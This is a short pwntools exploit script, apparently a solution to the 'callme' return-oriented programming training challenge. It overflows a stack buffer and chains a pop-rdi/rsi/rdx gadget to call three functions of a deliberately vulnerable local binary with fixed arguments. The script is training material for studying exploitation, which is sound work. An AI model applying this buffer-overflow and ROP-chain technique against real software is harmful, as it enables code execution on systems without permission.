from pwn import *

elf = ELF('../callme/callme')

p = process('../callme/callme')
# context.terminal = ["tmux", "splitw"]
# p = gdb.debug('../callme/callme')
p.recvuntil(b'> ')

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

rop = ROP(elf)
pop_rdi_rsi_rdx_ret = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0]

callme_one   = elf.symbols['callme_one']
callme_two   = elf.symbols['callme_two']
callme_three = elf.symbols['callme_three']

junk = 0x20 * b'A' + 0x8 * b'A'
payload =  junk
payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_one)
payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_two)
payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_three)

p.sendline(payload)
p.interactive()